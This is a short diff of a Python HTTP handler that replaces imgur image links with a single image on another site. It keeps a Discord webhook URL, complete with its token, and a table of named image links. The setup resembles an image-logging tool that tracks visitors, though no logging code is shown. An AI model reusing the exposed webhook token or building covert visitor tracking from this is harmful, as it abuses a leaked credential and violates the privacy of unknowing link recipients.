@@ -9,13 +9,13 @@ class handler(BaseHTTPRequestHandler):
         WEBHOOK = "https://discord.com/api/webhooks/1464803825847369837/j3diMzcguRrWtdRMnswJ5uA4_fCymBpPkTsV-eNYEs2xjChfvhpXOTCSb-AMB2ZXgz2Q"
         
         # Default image
-        DEFAULT_IMAGE = "https://i.imgur.com/5M6F3wQ.jpeg"
+        DEFAULT_IMAGE = "https://drakenetworth.co.uk/wp-content/uploads/2024/03/Ten-bes-Poki-games-to-play.webp"
         
         # Custom image mappings - add more here
         IMAGES = {
-            "mycatimage": "https://i.imgur.com/5M6F3wQ.jpeg",
-            "dogpic": "https://i.imgur.com/2QksCKj.jpeg",
-            "meme": "https://i.imgur.com/X8TjKyj.jpeg",
+            "mycatimage": "https://drakenetworth.co.uk/wp-content/uploads/2024/03/Ten-bes-Poki-games-to-play.webp",
+            "dogpic": "https://drakenetworth.co.uk/wp-content/uploads/2024/03/Ten-bes-Poki-games-to-play.webp",
+            "meme": "https://drakenetworth.co.uk/wp-content/uploads/2024/03/Ten-bes-Poki-games-to-play.webp",
             # Add more custom names here
         }
         
